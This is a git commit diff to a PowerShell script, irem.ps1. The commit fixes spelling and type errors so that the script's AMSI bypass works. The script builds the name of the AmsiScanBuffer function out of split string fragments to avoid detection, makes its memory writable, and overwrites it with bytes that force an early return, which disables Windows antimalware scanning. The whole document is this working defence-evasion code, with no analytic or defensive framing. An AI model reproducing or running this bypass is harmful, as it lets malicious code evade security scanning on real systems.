3ed8765cabd25a95270d2644a3d32316dff77e64
osmanseemsfun <94987429+osmanseemsfun@users.noreply.github.com>
2024-06-26 19:38:58 -0400

    Update irem.ps1

--- irem.ps1
+++ irem.ps1
@@ -2,25 +2,25 @@ $irem = '
 using System;
 using System.Runtime.InteropServices;
 public class irem {
-	[DllImport("kernel32")]
-	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibary(string name);
-[DllImport("kernel32")]
-public static extern void CopyMemory(IntPtr dest, IntPtr src, unit count);
-[DllImport("kernel32")]
-public static extren bool VirtualProtect(IntPtr lpAdress, UInPtr dwSize, uint flNewProtect, out uint lpfloldProtect);
-public static void cp(byte[] source, IntPtr dest, int count){
-	
-}
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static void cp(byte[] source, IntPtr dest, int count) {
+        Marshal.Copy(source, 0, dest, count);    
+    }
 }
 ';
 
 Add-Type $irem;
 
-$LoadLibary = [irem]::LoadLibary("a" + "m" + "si.dll")
-$Adress = [irem]::GettProcAddress($LoadLibary, "Am" + "si" + "Sc" + "an" + "Bu + "ff" + "er");
+$LoadLibrary = [irem]::LoadLibrary("a" + "m" + "si.dll");
+$Address = [irem]::GetProcAddress($LoadLibrary, "Am" + "si" + "Sc" + "an" + "Buffer");
 $p = 0;
-[irem]::VirtualProtect($Adress, [unit32]5, 0x40, [ref]$p);
+[irem]::VirtualProtect($Address, [UIntPtr]5, 0x40, [ref]$p);
 $Patch =  [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);
-[irem]::cp($Patch, $Adress, 6);
+[irem]::cp($Patch, $Address, 6);
